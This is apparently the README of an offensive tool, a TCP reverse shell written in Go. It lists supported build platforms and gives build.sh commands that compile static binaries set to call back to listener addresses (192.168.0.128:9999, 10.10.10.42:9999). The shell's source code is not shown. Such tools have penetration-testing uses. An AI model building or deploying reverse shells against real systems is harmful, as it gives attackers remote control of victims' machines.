# TCP reverse shell in Go

A reverse shell that can be compiled to all architectures supported by Go.

## Usage

List supported platforms.

~~~ bash
go tool dist list
~~~

Compile static binary.

~~~ bash
./build.sh GOARCH=arm GOOS=linux TARGET=192.168.0.128:9999
./build.sh GOARCH=amd64 GOOS=windows TARGET=10.10.10.42:9999
~~~
